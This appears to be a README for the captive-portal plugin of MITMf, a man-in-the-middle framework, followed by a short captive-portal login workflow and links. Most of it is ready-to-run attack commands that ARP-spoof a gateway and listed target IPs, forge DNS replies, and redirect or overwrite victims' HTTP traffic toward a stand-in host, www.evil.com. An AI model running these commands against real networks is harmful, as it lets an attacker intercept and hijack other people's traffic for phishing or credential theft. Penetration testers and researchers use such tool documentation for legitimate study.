

# Commands

This command simply modifies all HTTP (80/tcp) and redirects them to portalurl.
`python mitmf.py -i wlan0 --spoof --arp --gateway 192.168.178.1 --targets 192.168.178.29,192.168.178.21 --portal --portalurl http://www.evil.com`

Additionally to the above, this command listens for DNS queries and responsed with a forged CNAME and A record to redirect to the portal host. Race condition exists, as the legitimate response is not filtered.
`python mitmf.py -i wlan0 --log-level info --spoof --arp --gateway 192.168.178.1 --targets 192.168.178.21,192.168.178.29 --portal --portalurl http://www.evil.com --portaldns`

This command modifies all HTTP (80/tcp) responses and overwrites everything with the static template.
`python mitmf.py -i wlan0 --log-level info --spoof --dns --arp --gateway 192.168.178.1 --targets 192.168.178.21,192.168.178.29 --portal --portaltemplate /root/Tools/MITMf/config/portal/test.html`

If your are running a wifi access point you can use the following command (no spoofing required).
`python mitmf.py -i wlan0 --log-level info --portal --portalurl http://www.evil.com`

# Workflow
1. Client associates to the AP
2. Client starts a browser and generates ARP/DNS/HTTP traffic
3. HTTP gets captured by the Controller and then redirected to External CP server URL
4. Client sends a HTTP GET to the External CP server
5. External CP server sends XML-API to query where this client is coming from so that the CP server can provide location-based information
6. Client sees the login page and clicks accept
7. External CP server takes the accept and then send the XML-API user add to the controller and have the user role change

# Links
## MITMf Intro
* [Introducing MITMf - A Framework for Man-In-The-Middle Attacks](http://sign0f4.blogspot.de/2014/07/introducing-mitmf-framework-for-man-in.html)

## Related Work
* [Evil Portal](https://github.com/frozenjava/evilportal)

